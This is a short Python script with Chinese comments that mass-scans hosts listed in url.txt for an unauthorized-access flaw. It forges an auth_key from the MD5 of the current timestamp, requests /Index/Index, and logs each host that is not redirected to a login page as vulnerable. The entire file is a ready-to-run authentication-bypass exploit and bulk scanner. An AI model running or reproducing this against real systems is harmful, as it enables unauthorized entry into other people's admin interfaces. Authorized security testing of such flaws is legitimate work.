import hashlib
import time
import requests

def check(url):
    # 获取当前时间戳
    timestamps = int(time.time())
    # 将时间戳转换为字符串并进行编码
    timestamp_str = str(timestamps).encode('utf-8')
    # 创建一个MD5哈希对象
    hash_object = hashlib.md5()
    # 对时间戳进行加密
    hash_object.update(timestamp_str)
    # 获取加密后的结果
    encrypted_timestamp = hash_object.hexdigest()
    #  输出加密后并访问的url地址
    vuln = f"http://{url}/Index/Index?auth_key={encrypted_timestamp}&timestamp={timestamps}"
    #  请求这个漏洞地址
    response = requests.get(f"{vuln}")
    if "login" not in response.url:
        print(f"{vuln} 存在未授权漏洞")
        write_data(f"{vuln} 存在未授权漏洞")
   
def get_url():
    with open("url.txt","r+",encoding="utf-8") as f:
        data = f.readlines()
        return data
    
def write_data(content):
    with open('./result.txt','a',encoding='utf-8') as f:
        f.write(content+"\n")

if __name__ == '__main__':    

    data = get_url()
    for i in data:
        url = i.replace("\n","")
        try:
            check(url)
        except Exception as e:
            print(e)
        time.sleep(1)
